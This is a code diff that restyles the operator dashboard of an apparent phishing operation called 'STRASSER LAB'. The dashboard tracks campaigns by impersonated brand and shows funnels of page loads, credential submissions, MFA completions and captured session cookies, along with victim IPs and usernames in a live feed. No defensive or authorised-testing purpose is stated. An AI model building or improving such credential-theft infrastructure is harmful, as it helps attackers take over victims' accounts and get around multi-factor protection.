@@ -3,164 +3,451 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>STRASSER ⛫ LAB ANALYTICS</title>
+<title>STRASSER ⛫ LAB — Campaign Intelligence</title>
 <style>
+  :root {
+    --bg: #090c10;
+    --surface: #11161e;
+    --surface2: #181d27;
+    --border: #1e2530;
+    --text: #a1aab3;
+    --text-dim: #59616b;
+    --text-bright: #e8ecf1;
+    --green: #26a641;
+    --green-bg: #0a1f12;
+    --blue: #4199f5;
+    --blue-bg: #091a30;
+    --purple: #8b6ff0;
+    --purple-bg: #150d2e;
+    --red: #f5534b;
+    --red-bg: #2a0c0e;
+    --amber: #e8953b;
+    --amber-bg: #2a1a0a;
+    --radius: 8px;
+    --radius-sm: 4px;
+  }
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0d1117; color: #c9d1d9; padding: 24px; }
-  h1 { font-size: 1.25rem; font-weight: 600; margin-bottom: 20px; color: #f0f6fc; }
-  .summary { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 12px; margin-bottom: 28px; }
-  .card { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 16px; }
-  .card .label { font-size: 0.75rem; color: #8b949e; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 4px; }
-  .card .value { font-size: 1.5rem; font-weight: 600; color: #f0f6fc; }
-  .card .sub { font-size: 0.75rem; color: #8b949e; margin-top: 2px; }
-  h2 { font-size: 0.95rem; font-weight: 600; color: #f0f6fc; margin-bottom: 10px; margin-top: 24px; }
-  table { width: 100%; border-collapse: collapse; margin-bottom: 24px; font-size: 0.8rem; }
-  th { text-align: left; padding: 8px 10px; border-bottom: 1px solid #30363d; color: #8b949e; font-weight: 500; font-size: 0.72rem; text-transform: uppercase; }
-  td { padding: 6px 10px; border-bottom: 1px solid #21262d; }
-  tr:hover { background: #1c2129; }
-  .badge { display: inline-block; padding: 1px 6px; border-radius: 10px; font-size: 0.7rem; font-weight: 500; }
-  .badge-success { background: #033a16; color: #3fb950; }
-  .badge-fail { background: #3a0312; color: #f85149; }
-  .badge-capture { background: #0c2d6b; color: #58a6ff; }
-  .badge-proxy { background: #2e0c6b; color: #bc8cff; }
-  .badge-page_load { background: #1b212c; color: #8b949e; }
-  .badge-credential_submit { background: #1a2e1a; color: #7ee787; }
-  .badge-mfa_complete { background: #0c2d6b; color: #58a6ff; }
-  .badge-cookie_capture { background: #2e0c6b; color: #bc8cff; }
-  .mono { font-family: "SF Mono", "Fira Code", monospace; font-size: 0.75rem; }
-  .footer { margin-top: 24px; font-size: 0.7rem; color: #484f58; border-top: 1px solid #21262d; padding-top: 12px; }
-  .empty { color: #484f58; font-style: italic; padding: 20px 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    padding: 28px 32px;
+    min-height: 100vh;
+    line-height: 1.5;
+    -webkit-font-smoothing: antialiased;
+  }
 
-  /* Funnel progress bar */
-  .funnel-bar { display: flex; height: 20px; border-radius: 4px; overflow: hidden; background: #161b22; border: 1px solid #30363d; min-width: 120px; }
-  .funnel-bar .seg { transition: width 0.3s; }
-  .funnel-bar .seg-page_loads { background: #30363d; }
-  .funnel-bar .seg-credential_submit { background: #2ea043; }
-  .funnel-bar .seg-mfa_complete { background: #1f6feb; }
-  .funnel-bar .seg-cookie_capture { background: #8250df; }
+  /* Header */
+  .header {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 6px;
+  }
+  .header h1 {
+    font-size: 1.15rem;
+    font-weight: 600;
+    color: var(--text-bright);
+    letter-spacing: -0.01em;
+  }
+  .header .dot {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: var(--green);
+    box-shadow: 0 0 6px rgba(38,166,65,0.5);
+    animation: pulse 2s ease-in-out infinite;
+  }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.35} }
+  .header .dot.off { background: var(--text-dim); box-shadow: none; animation: none; }
+  .subtitle {
+    font-size: 0.75rem;
+    color: var(--text-dim);
+    margin-bottom: 28px;
+    letter-spacing: 0.03em;
+    text-transform: uppercase;
+  }
 
-  /* Recent activity feed */
-  #recent-feed { max-height: 400px; overflow-y: auto; }
-  .feed-item { padding: 6px 8px; border-bottom: 1px solid #21262d; font-size: 0.78rem; display: flex; align-items: center; gap: 10px; }
-  .feed-item .ts { color: #484f58; font-family: "SF Mono", "Fira Code", monospace; font-size: 0.7rem; white-space: nowrap; }
-  .feed-item .detail { color: #8b949e; }
+  /* Summary Cards */
+  .summary {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+    gap: 12px;
+    margin-bottom: 36px;
+  }
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 18px 20px;
+    position: relative;
+    overflow: hidden;
+  }
+  .card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0;
+    width: 3px; height: 100%;
+    background: var(--border);
+    border-radius: var(--radius) 0 0 var(--radius);
+  }
+  .card.total::before   { background: var(--blue); }
+  .card.rate::before    { background: var(--green); }
+  .card.ips::before     { background: var(--purple); }
+  .card.campaigns::before { background: var(--amber); }
+  .card .label {
+    font-size: 0.65rem;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    margin-bottom: 6px;
+    font-weight: 600;
+  }
+  .card .value {
+    font-size: 1.75rem;
+    font-weight: 700;
+    color: var(--text-bright);
+    letter-spacing: -0.02em;
+    line-height: 1.1;
+  }
+  .card .sub {
+    font-size: 0.7rem;
+    color: var(--text-dim);
+    margin-top: 4px;
+  }
 
-  .live-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: #3fb950; margin-right: 6px; animation: pulse 2s infinite; }
-  @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+  /* Section Headers */
+  .section-header {
+    display: flex;
+    align-items: baseline;
+    gap: 10px;
+    margin: 32px 0 14px;
+  }
+  .section-header h2 {
+    font-size: 0.85rem;
+    font-weight: 600;
+    color: var(--text-bright);
+    letter-spacing: -0.01em;
+  }
+  .section-header .count {
+    font-size: 0.68rem;
+    color: var(--text-dim);
+  }
+
+  /* Tables */
+  .table-wrap {
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    overflow: hidden;
+    margin-bottom: 8px;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 0.78rem;
+  }
+  th {
+    text-align: left;
+    padding: 10px 14px;
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    color: var(--text-dim);
+    font-weight: 600;
+    font-size: 0.65rem;
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+    white-space: nowrap;
+  }
+  td {
+    padding: 9px 14px;
+    border-bottom: 1px solid rgba(30,37,48,0.5);
+    color: var(--text);
+  }
+  tbody tr:hover { background: var(--surface2); }
+  tbody tr:last-child td { border-bottom: none; }
+  .mono {
+    font-family: "SF Mono", "Fira Code", "JetBrains Mono", monospace;
+    font-size: 0.72rem;
+  }
+
+  /* Badges */
+  .badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+    padding: 2px 8px;
+    border-radius: 10px;
+    font-size: 0.65rem;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.03em;
+    white-space: nowrap;
+  }
+  .badge::before {
+    content: '';
+    width: 5px; height: 5px;
+    border-radius: 50%;
+    flex-shrink: 0;
+  }
+  .badge-page_load          { background: var(--surface2); color: var(--text-dim); }
+  .badge-page_load::before  { background: var(--text-dim); }
+  .badge-credential_submit           { background: var(--green-bg); color: var(--green); }
+  .badge-credential_submit::before   { background: var(--green); }
+  .badge-mfa_complete         { background: var(--blue-bg); color: var(--blue); }
+  .badge-mfa_complete::before { background: var(--blue); }
+  .badge-cookie_capture        { background: var(--purple-bg); color: var(--purple); }
+  .badge-cookie_capture::before { background: var(--purple); }
+  .badge-success { background: var(--green-bg); color: var(--green); }
+
+  /* Funnel Bar */
+  .funnel-bar {
+    display: flex;
+    height: 18px;
+    border-radius: var(--radius-sm);
+    overflow: hidden;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    min-width: 100px;
+  }
+  .funnel-bar .seg { transition: flex 0.3s ease; }
+  .seg-page_loads        { background: #2d333b; }
+  .seg-credential_submit { background: var(--green); }
+  .seg-mfa_complete      { background: var(--blue); }
+  .seg-cookie_capture    { background: var(--purple); }
+
+  /* Progress bar (rate column) */
+  .rate-bar {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .rate-bar .bar-track {
+    flex: 1;
+    height: 6px;
+    border-radius: 3px;
+    background: var(--surface);
+    overflow: hidden;
+    min-width: 50px;
+  }
+  .rate-bar .bar-fill {
+    height: 100%;
+    border-radius: 3px;
+    transition: width 0.4s ease;
+  }
+  .rate-bar .bar-fill.high { background: var(--green); }
+  .rate-bar .bar-fill.mid  { background: var(--amber); }
+  .rate-bar .bar-fill.low  { background: var(--red); }
+  .rate-bar .pct {
+    font-size: 0.72rem;
+    font-weight: 600;
+    color: var(--text);
+    min-width: 36px;
+    text-align: right;
+  }
+
+  /* Live Feed */
+  #recent-feed {
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    overflow: hidden;
+    max-height: 360px;
+    overflow-y: auto;
+    position: relative;
+  }
+  #recent-feed::after {
+    content: '';
+    position: sticky;
+    bottom: 0; left: 0; right: 0;
+    height: 80px;
+    display: block;
+    background: linear-gradient(to top, var(--surface), transparent);
+    pointer-events: none;
+    border-radius: 0 0 var(--radius) var(--radius);
+  }
+  .feed-item {
+    padding: 8px 14px;
+    border-bottom: 1px solid rgba(30,37,48,0.4);
+    font-size: 0.75rem;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .feed-item:last-child { border-bottom: none; }
+  .feed-item:hover { background: var(--surface2); }
+  .feed-item .ts {
+    color: var(--text-dim);
+    font-family: "SF Mono", "Fira Code", monospace;
+    font-size: 0.68rem;
+    white-space: nowrap;
+    min-width: 155px;
+  }
+  .feed-item .victim {
+    color: var(--text-bright);
+    font-weight: 500;
+  }
+  .feed-item .campaign {
+    color: var(--text-dim);
+  }
+
+  /* Empty state */
+  .empty {
+    color: var(--text-dim);
+    font-style: italic;
+    padding: 28px;
+    text-align: center;
+    border: 1px dashed var(--border);
+    border-radius: var(--radius);
+  }
+
+  /* Footer */
+  .footer {
+    margin-top: 32px;
+    padding-top: 14px;
+    border-top: 1px solid var(--border);
+    font-size: 0.68rem;
+    color: var(--text-dim);
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+  #poll-status { color: var(--green); font-weight: 500; }
+
+  /* Scrollbar */
+  ::-webkit-scrollbar { width: 6px; }
+  ::-webkit-scrollbar-track { background: transparent; }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
 </style>
 </head>
 <body>
-<h1><span class="live-dot" id="live-dot"></span>STRASSER ⛫ LAB ANALYTICS</h1>
-<p style='color:#8b949e;font-size:0.8rem;margin:-12px 0 20px 0'>Campaign Intelligence Dashboard</p>
+
+<div class="header">
+  <div class="dot" id="live-dot"></div>
+  <h1>STRASSER ⛫ LAB</h1>
+</div>
+<p class="subtitle">Campaign Intelligence Dashboard</p>
 
 <div class="summary" id="summary-cards">
-  <div class="card">
+  <div class="card total">
     <div class="label">Total Events</div>
     <div class="value">{{.Total}}</div>
   </div>
-  <div class="card">
+  <div class="card rate">
     <div class="label">Success Rate</div>
     <div class="value">{{printf "%.1f" .SuccessRate}}%</div>
-    <div class="sub">captured / total</div>
+    <div class="sub">MFA / page loads</div>
   </div>
-  <div class="card">
+  <div class="card ips">
     <div class="label">Unique IPs</div>
     <div class="value">{{.UniqueIPs}}</div>
   </div>
-  <div class="card">
+  <div class="card campaigns">
     <div class="label">Active Campaigns</div>
     <div class="value">{{.ActiveCampaigns}}</div>
   </div>
 </div>
 
-<h2>Campaign Funnels</h2>
+<div class="section-header">
+  <h2>Campaign Funnels</h2>
+  <span class="count">{{len .Funnels}} campaigns</span>
+</div>
 {{if .Funnels}}
+<div class="table-wrap">
 <table>
   <thead>
     <tr>
-      <th>Campaign ID</th>
+      <th>Campaign</th>
       <th>Brand</th>
+      <th>Victims</th>
       <th>Page Loads</th>
-      <th>Creds</th>
-      <th>MFA</th>
-      <th>Captured</th>
-      <th>Rate</th>
+      <th>Credentials</th>
+      <th>MFA Complete</th>
       <th>Funnel</th>
+      <th>Rate</th>
     </tr>
   </thead>
   <tbody>
-  {{$maxLoads := 0}}
-  {{range .Funnels}}
-    {{if gt .PageLoads $maxLoads}}{{/*template*/}}{{end}}
-  {{end}}
   {{range .Funnels}}
     <tr>
-      <td class="mono">{{.CampaignID}}</td>
+      <td class="mono">{{if .CampaignID}}{{.CampaignID}}{{else}}&mdash;{{end}}</td>
       <td>{{.Brand}}</td>
+      <td class="mono">{{len .Victims}}</td>
       <td>{{.PageLoads}}</td>
       <td><span class="badge badge-credential_submit">{{.CredSubmits}}</span></td>
       <td><span class="badge badge-mfa_complete">{{.MfaCompletes}}</span></td>
-      <td><span class="badge badge-cookie_capture">{{.CookieCaptures}}</span></td>
-      <td>{{printf "%.0f" .SuccessRate}}%</td>
       <td>
-        <div class="funnel-bar" title="PL:{{.PageLoads}} CR:{{.CredSubmits}} MFA:{{.MfaCompletes}} CC:{{.CookieCaptures}}">
+        <div class="funnel-bar" title="PL:{{.PageLoads}} CR:{{.CredSubmits}} MFA:{{.MfaCompletes}} CCK:{{.CookieCaptures}}">
           {{$pl := .PageLoads}}{{if gt $pl 0}}<div class="seg seg-page_loads" style="flex: {{$pl}}"></div>{{end}}
           {{$cr := .CredSubmits}}{{if gt $cr 0}}<div class="seg seg-credential_submit" style="flex: {{$cr}}"></div>{{end}}
           {{$mf := .MfaCompletes}}{{if gt $mf 0}}<div class="seg seg-mfa_complete" style="flex: {{$mf}}"></div>{{end}}
           {{$cc := .CookieCaptures}}{{if gt $cc 0}}<div class="seg seg-cookie_capture" style="flex: {{$cc}}"></div>{{end}}
         </div>
       </td>
+      <td>
+        <div class="rate-bar">
+          <div class="bar-track">
+            {{$rate := printf "%.0f" .SuccessRate}}
+            <div class="bar-fill {{if ge .SuccessRate 30.0}}high{{else if ge .SuccessRate 10.0}}mid{{else}}low{{end}}" style="width: {{$rate}}%"></div>
+          </div>
+          <span class="pct">{{$rate}}%</span>
+        </div>
+      </td>
     </tr>
   {{end}}
   </tbody>
 </table>
+</div>
 {{else}}
-<p class="empty">No campaign data yet.</p>
+<p class="empty">No campaign data yet — waiting for events.</p>
 {{end}}
 
-<h2>Top Victim IPs</h2>
+<div class="section-header">
+  <h2>Top Victim IPs</h2>
+  <span class="count">{{len .TopIPs}} IPs</span>
+</div>
 {{if .TopIPs}}
+<div class="table-wrap">
 <table>
   <thead>
-    <tr>
-      <th>IP Address</th>
-      <th>Events</th>
-      <th>Last Seen</th>
-    </tr>
+    <tr><th>IP Address</th><th>Events</th><th>Last Seen</th></tr>
   </thead>
   <tbody>
   {{range .TopIPs}}
     <tr>
       <td class="mono">{{.IP}}</td>
-      <td>{{.Count}}</td>
+      <td><span class="badge badge-cookie_capture">{{.Count}}</span></td>
       <td class="mono">{{.Last}}</td>
     </tr>
   {{end}}
   </tbody>
 </table>
+</div>
 {{else}}
 <p class="empty">No IP data yet.</p>
 {{end}}
 
-<h2>Recent Activity <span style="font-weight:400;font-size:0.7rem;color:#484f58;" id="poll-status">live</span></h2>
+<div class="section-header">
+  <h2>Recent Activity</h2>
+  <span class="count" id="poll-status">live</span>
+</div>
 <div id="recent-feed">
 {{if .Recent}}
 {{range .Recent}}
   <div class="feed-item">
     <span class="ts">{{.Timestamp}}</span>
     <span class="badge badge-{{.EventType}}">{{.EventType}}</span>
-    <span class="mono">{{.CampaignID}}</span>
+    <span class="campaign mono">{{if .CampaignID}}{{.CampaignID}}{{else}}&mdash;{{end}}</span>
     <span>{{.Brand}}</span>
-    <span class="mono">{{.IP}}</span>
-    <span class="detail">{{.Username}}</span>
+    <span class="mono" style="color:var(--text-dim);font-size:0.7rem">{{.IP}}</span>
+    <span class="victim">{{if .Username}}{{.Username}}{{else}}&mdash;{{end}}</span>
   </div>
 {{end}}
 {{else}}
-<p class="empty">No events yet.</p>
+<p class="empty">No events yet — waiting for campaign activity.</p>
 {{end}}
 </div>
 
-<div class="footer" id="footer-info">Generated {{.GeneratedAt}} &middot; Live polling every 10s</div>
+<div class="footer">
+  <span>Generated {{.GeneratedAt}}</span>
+  <span>Live polling every 10s</span>
 </div>
 
 <script>
@@ -172,26 +459,26 @@
 
   function poll() {
     statusEl.textContent = 'polling...';
-    fetch('/api/events?since=' + encodeURIComponent(since))
+    statusEl.style.color = 'var(--text-dim)';
+    fetch('/api/events')
       .then(function(r) {
         if (!r.ok) throw new Error('status ' + r.status);
         return r.json();
       })
       .then(function(data) {
         statusEl.textContent = 'live';
+        statusEl.style.color = 'var(--green)';
         if (!data || !data.Recent || data.Recent.length === 0) return;
 
-        // Update summary cards
         var sc = document.getElementById('summary-cards');
         if (sc && data.Total !== undefined) {
           sc.innerHTML =
-            '<div class="card"><div class="label">Total Events</div><div class="value">' + data.Total + '</div></div>' +
-            '<div class="card"><div class="label">Success Rate</div><div class="value">' + (data.SuccessRate || 0).toFixed(1) + '%</div><div class="sub">captured / total</div></div>' +
-            '<div class="card"><div class="label">Unique IPs</div><div class="value">' + (data.UniqueIPs || 0) + '</div></div>' +
-            '<div class="card"><div class="label">Active Campaigns</div><div class="value">' + (data.ActiveCampaigns || 0) + '</div></div>';
+            '<div class="card total"><div class="label">Total Events</div><div class="value">' + esc(data.Total) + '</div></div>' +
+            '<div class="card rate"><div class="label">Success Rate</div><div class="value">' + (data.SuccessRate || 0).toFixed(1) + '%</div><div class="sub">MFA / page loads</div></div>' +
+            '<div class="card ips"><div class="label">Unique IPs</div><div class="value">' + (data.UniqueIPs || 0) + '</div></div>' +
+            '<div class="card campaigns"><div class="label">Active Campaigns</div><div class="value">' + (data.ActiveCampaigns || 0) + '</div></div>';
         }
 
-        // Prepend new events to feed (newest first)
         var recents = data.Recent || [];
         for (var i = recents.length - 1; i >= 0; i--) {
           var ev = recents[i];
@@ -200,37 +487,49 @@
           div.innerHTML =
             '<span class="ts">' + esc(ev.timestamp) + '</span>' +
             '<span class="badge badge-' + esc(ev.event_type) + '">' + esc(ev.event_type) + '</span>' +
-            '<span class="mono">' + esc(ev.campaign_id) + '</span>' +
+            '<span class="campaign mono">' + esc(ev.campaign_id || '—') + '</span>' +
             '<span>' + esc(ev.brand) + '</span>' +
-            '<span class="mono">' + esc(ev.ip) + '</span>' +
-            '<span class="detail">' + esc(ev.username) + '</span>';
+            '<span class="mono" style="color:var(--text-dim);font-size:0.7rem">' + esc(ev.ip) + '</span>' +
+            '<span class="victim">' + esc(ev.username || '—') + '</span>';
           feedEl.insertBefore(div, feedEl.firstChild);
         }
+        while (feedEl.children.length > 50) { feedEl.removeChild(feedEl.lastChild); }
+        if (recents.length > 0) { since = recents[recents.length - 1].timestamp; }
 
-        // Keep only last 50 items
-        while (feedEl.children.length > 50) {
-          feedEl.removeChild(feedEl.lastChild);
-        }
-
-        if (recents.length > 0) {
-          since = recents[recents.length - 1].timestamp;
-        }
-
-        // Update footer
         var footer = document.getElementById('footer-info');
         if (footer && data.GeneratedAt) {
-          footer.textContent = 'Generated ' + data.GeneratedAt + ' · Live polling every 10s';
+          footer.innerHTML = '<span>Generated ' + esc(data.GeneratedAt) + '</span><span>Live polling every 10s</span>';
         }
       })
       .catch(function(err) {
-        statusEl.textContent = 'error: ' + err.message;
+        statusEl.textContent = 'disconnected';
+        statusEl.style.color = 'var(--red)';
+        dotEl.classList.add('off');
       });
   }
 
   function esc(s) { return (s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
 
-  // Initial data already rendered server-side; start polling for deltas
-  dotEl.style.display = 'inline-block';
+  // Animate stat card values on load
+  (function() {
+    document.querySelectorAll('.card .value').forEach(function(el) {
+      var text = el.textContent;
+      var match = text.match(/^([\d.]+)(.*)/);
+      if (!match || isNaN(match[1])) return;
+      var target = parseFloat(match[1]);
+      var suffix = match[2] || '';
+      var current = 0;
+      var frames = 40;
+      var inc = target / frames;
+      function step() {
+        current = Math.min(current + inc, target);
+        el.textContent = (target < 10 ? current.toFixed(1) : Math.round(current)) + suffix;
+        if (current < target) requestAnimationFrame(step);
+      }
+      requestAnimationFrame(step);
+    });
+  })();
+
   setInterval(poll, 10000);
 })();
 </script>
